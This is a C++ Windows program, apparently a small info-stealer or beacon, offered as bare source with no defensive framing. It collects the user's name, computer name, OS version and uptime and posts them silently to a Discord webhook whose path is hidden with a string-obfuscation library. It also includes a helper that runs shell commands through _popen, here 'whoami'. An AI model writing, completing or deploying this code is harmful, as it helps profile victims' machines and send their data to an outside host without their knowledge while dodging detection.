#include <chrono>
#include <iostream>
#include <regex>
#include <curl/curl.h>
#include <string>
#include "oxorany/oxorany_include.h"
#include <Lmcons.h>

std::string wstring_to_string(const std::wstring& wstr) {
    return std::string(wstr.begin(), wstr.end());
}

std::string escapeForJson(const std::string& input) {
    std::ostringstream escaped;
    for (char c : input) {
        switch (c) {
            case '"': escaped << "\\\""; break;
            case '\\': escaped << "\\\\"; break;
            case '\b': escaped << "\\b"; break;
            case '\f': escaped << "\\f"; break;
            case '\n': escaped << "\\n"; break;
            case '\r': escaped << "\\r"; break;
            case '\t': escaped << "\\t"; break;
            default:
                if (c < 0x20 || c > 0x7E) {
                    escaped << "\\u" << std::hex << std::uppercase << static_cast<int>(c);
                } else {
                    escaped << c;
                }
        }
    }
    return escaped.str();
}

bool sendWebhookMessage(const std::string& webhookUrl, const std::string& message) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    std::string jsonData = R"({"content": ")" + escapeForJson(message) + R"("})";

    curl_easy_setopt(curl, CURLOPT_URL, webhookUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());

    struct curl_slist* headers = curl_slist_append(nullptr, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    bool success = curl_easy_perform(curl) == CURLE_OK;

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    curl_global_cleanup();

    return success;
}

std::string executeCMD(const char* cmd) {
    char buffer[128];
    std::string result;
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

std::string getUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    return GetUserNameA(username, &username_len) ? std::string(username) : "Unknown User";
}

std::string getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    return GetComputerNameA(computerName, &size) ? std::string(computerName) : "Unknown Computer";
}

std::string getOSVersion() {
    OSVERSIONINFOEXA osvi = {};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    return GetVersionExA(reinterpret_cast<OSVERSIONINFOA*>(&osvi)) ?
           "Windows " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion) :
           "Unknown OS Version";
}

std::string getSystemUptime() {
    auto uptime = std::chrono::milliseconds(GetTickCount64());
    auto hours = std::chrono::duration_cast<std::chrono::hours>(uptime).count();
    auto minutes = std::chrono::duration_cast<std::chrono::minutes>(uptime).count() % 60;
    return std::to_string(hours) + " hours, " + std::to_string(minutes) + " minutes";
}

int main() {
    std::string user = getUsername();
    std::string computer = getComputerName();
    std::string osVersion = getOSVersion();
    std::string uptime = getSystemUptime();

    std::string message = "User: " + user + "\nComputer: " + computer + "\nOS Version: " + osVersion + "\nUptime: " + uptime;

    std::wstring webhookSuffix = oxorany(L"api/webhooks/?????????????/?????????????????????????????????????????");
    std::string fullWebhookUrl = "https://discord.com/" + wstring_to_string(webhookSuffix);

    sendWebhookMessage(fullWebhookUrl, message);
    executeCMD("whoami");

    return 0;
}
